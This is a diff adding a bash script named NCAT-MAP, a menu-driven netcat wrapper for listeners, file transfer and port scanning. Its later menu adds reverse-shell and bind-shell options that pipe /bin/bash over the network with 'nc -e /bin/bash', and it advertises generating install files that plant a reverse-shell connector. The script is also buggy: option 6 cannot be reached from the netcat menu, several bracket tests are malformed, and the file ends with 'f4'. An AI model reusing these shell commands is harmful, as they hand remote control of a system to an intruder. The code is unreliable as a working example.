@@ -1,0 +1,547 @@
+#!/bin/bash
+#Version: Alpha 1.0
+
+#Pre-Initialization Stage
+reset () {
+  clear
+  figlet NCAT-MAP
+  echo "--------------------------------------------------------------------------------"
+}
+
+#Start
+clear
+figlet NCAT-MAP
+echo "--------------------------------------------------------------------------------"
+echo "|Made by BaconBombz|Hosted on GitHub|"
+echo "--------------------------------------------------------------------------------"
+
+#Not Taking Responsibility
+read -p "Do You Have Permission To Use This Tool On A Network? [yes/no]: " safety
+
+#Listing Menu
+reset
+if [ $safety == yes ]
+then
+  cat<< END
+1) NetCat
+2) NMap
+3) CryptCat
+0) Exit
+END
+echo "--------------------------------------------------------------------------------"
+read -p "Option: " Operation
+elif [ $safety == no ]
+then
+  echo "THEN NEVER TRY THIS."
+  exit
+else
+  echo "Hmm? Try Again."
+  exit
+fi
+
+#NetCat
+if [ $Operation == 1 ]
+then
+  reset
+  cat<<END
+1) Create A Listener
+2) Connect To A Listener
+3) Send A File
+4) Receive A File
+5) Perform A Scan For Open Ports (Very Obvious)
+0) Go Back
+END
+read -p "Option: " ncOp
+fi
+
+#ncOp 1
+if [ $ncOp == 1 ]
+then
+  reset
+  read -p "Create A Listener? [yes/no]: " cListener
+  if [ $cListener == yes ]
+  then
+    reset
+    read -p "Use Verbose Mode? [yes/no]: " vModeOn
+    if [ $vModeOn == yes ]
+    then
+      reset
+      read -p "Port: " cLVMOPort
+      clear
+      figlet NCAT-MAP
+      echo "--------------------------------------------------------------------------------"
+      echo "Press CTRL-C To Stop"
+      echo "3"
+      sleep 1
+      echo "2"
+      sleep 1
+      echo "1"
+      sleep 1
+      reset
+      echo "NetCat Is Active"
+      nc -l -p $cLVMOPort -vv
+      echo "--------------------------------------------------------------------------------"
+      read -p "Go Back? [yes/no]: " back
+      if [ $back == yes ]
+      then
+        ./ncat-map
+      fi
+    elif [ $vModeOn == no ]
+    then
+      reset
+      read -p "Port: " cLVMOPort
+      reset
+      echo "Press CTRL-C To Stop"
+      echo "3"
+      sleep 1
+      echo "2"
+      sleep 1
+      echo "1"
+      sleep 1
+      reset
+      echo "NetCat Is Active"
+      nc -l -p $cLVMOPort
+      echo "--------------------------------------------------------------------------------"
+      read -p "Go Back? [yes/no]: " back
+      if [ $back == yes ]
+      then
+        ./ncat-map
+      fi
+    fi
+  elif  [ $cListener == no ]
+  then
+    reset
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./ncat-map
+    fi
+  fi
+fi
+
+#ncOp 2
+if [ $ncOp == 2 ]
+then
+  reset
+  read -p "Connect To A Listener? [yes/no]: " ctListener
+  if [ $ctListener == yes ]
+  then
+    reset
+    read -p "Use Verbose Mode? [yes/no]: " vModeOn
+    if [ $vModeOn == yes ]
+    then
+      reset
+      read -p "Port: " ctLVMOPort
+      reset
+      read -p "Listener IP: " ctLIP
+      reset
+      echo "Press CTRL-C To Stop"
+      echo "3"
+      sleep 1
+      echo "2"
+      sleep 1
+      echo "1"
+      sleep 1
+      reset
+      echo "NetCat Is Active"
+      nc $ctLIP $ctLVMOPort -vv
+      echo "--------------------------------------------------------------------------------"
+      read -p "Go Back? [yes/no]: " back
+      if [ $back == yes ]
+      then
+        ./ncat-map
+      fi
+    elif [ $vModeOn == no ]
+    then
+      reset
+      read -p "Port: " cLVMdPort
+      reset
+      read -p "Listener IP: " ctLIP
+      reset
+      echo "Press CTRL-C To Stop"
+      echo "3"
+      sleep 1
+      echo "2"
+      sleep 1
+      echo "1"
+      sleep 1
+      reset
+      echo "NetCat Is Active"
+      nc $ctLIP $cLVMdPort
+      echo "--------------------------------------------------------------------------------"
+      read -p "Go Back? [yes/no]: " back
+      if [ $back == yes ]
+      then
+        ./ncat-map
+      fi
+    fi
+  elif  [ $ctListener == no ]
+  then
+    reset
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./ncat-map
+    fi
+  fi
+fi
+
+#ncOp 3
+if [ $ncOp == 3 ]
+then
+  reset
+  read -p "Send A File? [yes/no]: " sFile
+  if [ $sFile == yes ]
+  then
+    reset
+    read -p "Use Verbose Mode? [yes/no]: " vModeOn
+    if [ $vModeOn == yes ]
+    then
+      reset
+      read -p "Port: " sFVMOPort
+      reset
+      read -p "Receiving IP: " sFVMORIP
+      reset
+      read -p "File Location: " sFVMOFL
+      reset
+      echo "Press CTRL-C To Stop"
+      echo "3"
+      sleep 1
+      echo "2"
+      sleep 1
+      echo "1"
+      sleep 1
+      reset
+      echo "NetCat Is Active"
+      nc  -w 1 -vv $sFVMORIP $sFVMOPort < $sFVMOFL
+      echo "--------------------------------------------------------------------------------"
+      read -p "Go Back? [yes/no]: " back
+      if [ $back == yes ]
+      then
+        ./ncat-map
+      fi
+    elif [ $vModeOn == no ]
+    then
+      reset
+      read -p "Port: " sFVMDPort
+      reset
+      read -p "Receiving IP: "  sFVMDRIP
+      reset
+      read -p "File Location: " sFVMDFL
+      reset
+      echo "Press CTRL-C To Stop"
+      echo "3"
+      sleep 1
+      echo "2"
+      sleep 1
+      echo "1"
+      sleep 1
+      reset
+      echo "NetCat Is Active"
+      nc -w 1 $sFVMDRIP $sFVMDPort < $sFVMDFL
+      echo "--------------------------------------------------------------------------------"
+      read -p "Go Back? [yes/no]: " back
+      if [ $back == yes ]
+      then
+        ./ncat-map
+      fi
+    fi
+  elif  [ $sFile == no ]
+  then
+    reset
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./ncat-map
+    fi
+  fi
+fi
+
+#ncOp 4
+if [ $ncOp == 4 ]
+then
+  reset
+  read -p "Receive A File? [yes/no]: " rFile
+  if [ $rFile == yes ]
+  then
+    reset
+    read -p "Use Verbose Mode? [yes/no]: " vModeOn
+    if [ $vModeOn == yes ]
+    then
+      reset
+      read -p "Port: " rFVMOPort
+      reset
+      read -p "File Name: " rFVMOFn
+      reset
+      echo "Press CTRL-C To Stop"
+      echo "3"
+      sleep 1
+      echo "2"
+      sleep 1
+      echo "1"
+      sleep 1
+      reset
+      echo "NetCat Is Active"
+      nc  -vv -l -p $rFVMOPort > Files-Received/$rFVMOFn
+      echo "--------------------------------------------------------------------------------"
+      read -p "Go Back? [yes/no]: " back
+      if [ $back == yes ]
+      then
+        ./ncat-map
+      fi
+    elif [ $vModeOn == no ]
+    then
+      reset
+      read -p "Port: " rFVMDPort
+      reset
+      read -p "File Name: " rFVMDFn
+      reset
+      echo "Press CTRL-C To Stop"
+      echo "3"
+      sleep 1
+      echo "2"
+      sleep 1
+      echo "1"
+      sleep 1
+      reset
+      echo "NetCat Is Active"
+      nc -l -p $rFVMDPort > Files-Received/$rFVMDFn
+      echo "--------------------------------------------------------------------------------"
+      read -p "Go Back? [yes/no]: " back
+      if [ $back == yes ]
+      then
+        ./ncat-map
+      fi
+    fi
+  elif  [ $rFile == no ]
+  then
+    reset
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./ncat-map
+    fi
+  fi
+fi
+
+#ncOp 5
+if [ $ncOp == 5 ]
+then
+  reset
+  read -p "Perform A Network Scan For Open Ports (Very Obvious)? [yes/no]: " sNOP
+  if [ $sNOP == yes ]
+  then
+    reset
+    read -p "Port Range (e.x. 1-1000): " sNOPPRange
+    reset
+    read -p "Target IP: " sNOPTIP
+    reset
+    read -p "Name For Scan Results File: " sNOPRFName
+    reset
+    echo "Press CTRL-C To Stop"
+    echo "3"
+    sleep 1
+    echo "2"
+    sleep 1
+    echo "1"
+    sleep 1
+    reset
+    echo "NetCat Is Active"
+    echo "Please Wait. Ports Are Being Scanned."
+    mkdir Scan-Results/$sNOPRFName
+    touch Scan-Results/$sNOPRFName/$sNOPRFName.txt
+    nc -z -vv -w 5 $sNOPTIP $sNOPPRange > Scan-Results/$sNOPRFName/$sNOPRFName.txt 2>&1
+    if [ -e Scan-Results/$sNOPRFName/$sNOPRFName.txt ]
+    then
+    echo "--------------------------------------------------------------------------------"
+    echo "Scan Results Saved To Scan-Results/$sNOPRFName/$sNOPRFName.txt "
+    echo "--------------------------------------------------------------------------------"
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./ncat-map
+    fi
+  elif [ ! -e Scan-Results/$sNOPRFName/$sNOPRFName.txt ]
+    then
+      echo "--------------------------------------------------------------------------------"
+      echo "File Was Not Created "
+      echo "--------------------------------------------------------------------------------"
+      read -p "Go Back? [yes/no]: " back
+      if [ $back == yes ]
+      then
+        ./ncat-map
+      fi
+    fi
+  elif  [ $cRSListener == no ]
+  then
+    reset
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./ncat-map
+    fi
+  fi
+fi
+
+if [ $ncOp == 6 ]
+then
+  reset
+  cat<<END
+  1) Listen For a Reverse-Shell Connection
+  2) Connect To A Reverse-Shell Listener !!!
+  3) Listen for a Bind-Shell Connection
+  4) Connect To A Bind-Shell Listener !!!
+  5) Generate An Install File That Installs & Runs A Reverse-Shell Connector
+  6) Generate An Install File That Installs & Runs A Bind-Shell Listener
+  0) Exit
+END
+  read -p "Option: " ncrsOptions
+fi
+
+#ncrsOperation 1
+if [ $ncrsOptions == 1 ]
+then
+  reset
+  read -p "Listen For A Reverse-Shell? [yes/no]" lfars
+  if [ $lfars == yes]
+  then
+    read -p "Listener Port: " rslPort
+    reset
+    echo "Press CTRL-C To Stop"
+    echo "3"
+    sleep 1
+    echo "2"
+    sleep 1
+    echo "1"
+    sleep 1
+    reset
+    echo "NetCat Is Active"
+    nc -l -p $rslPort
+    reset
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./ncat-map
+    fi
+  elif [ $lfars == "no"]
+  then
+    reset
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./ncat-map
+    fi
+  fi
+fi
+
+#ncrsOptions 2
+if [ $ncrsOptions == 2 ]
+then
+  reset
+  read -p "Connect To A Reverse-Shell Listener? [yes/no]: " ctarsl
+  if [ $ctarsl == yes]
+  then
+    reset
+    read -p "Listener IP: " lip
+    reset
+    read -p "Listener Port: " lp
+    reset
+    echo "Press CTRL-C To Stop"
+    echo "3"
+    sleep 1
+    echo "2"
+    sleep 1
+    echo "1"
+    sleep 1
+    reset
+    nc $lip $lp -e /bin/bash
+    reset
+    read -p "Go Back? [yes/no]" back
+    if [ $back == yes]
+    then
+      ./ncat-map
+    fi
+  elif [ $ctarsl == no]
+  then
+    reset
+    read -p "Go Back? [yes/no]" back
+    if [ $back == yes ]
+    then
+      ./ncat-map
+    fi
+  fi
+fi
+
+#ncrsOperation 3
+if [ $ncrsOptions == 3 ]
+then
+  reset
+  read -p "Listen For A Bind-Shell? [yes/no]" lfabs
+  if [ $lfabs == yes]
+  then
+    read -p "Port To Listen On: " ptlo
+    reset
+    echo "Press CTRL-C To Stop"
+    echo "3"
+    sleep 1
+    echo "2"
+    sleep 1
+    echo "1"
+    sleep 1
+    reset
+    echo "NetCat Is Active"
+    nc -l -p $ptlo -e /bin/bash
+    reset
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./ncat-map
+    fi
+  elif [ $lfabs == "no"]
+  then
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./ncat-map
+    fi
+  fi
+fi
+
+
+#ncrsOptions 4
+if [ $ncrsOptions == 4 ]
+then
+  reset
+  read -p "Connect To A Bind-Shell Listener? [yes/no]: " ctabsl
+  if [ $ctabsl == yes]
+  then
+    reset
+    read -p "Listener IP: " lip
+    reset
+    read -p "Listener Port: " lp
+    reset
+    echo "Press CTRL-C To Stop"
+    echo "3"
+    sleep 1
+    echo "2"
+    sleep 1
+    echo "1"
+    sleep 1
+    reset
+    nc $lip $lp
+    reset
+    read -p "Go Back? [yes/no]" back
+    if [ $back == yes]
+    then
+      ./ncat-map
+    fi
+  elif [ $ctarsl == no]
+  then
+    reset
+    read -p "Go Back? [yes/no]" back
+    if [ $back == yes ]
+    then
+      ./ncat-map
+    fi
+  fi
+f4
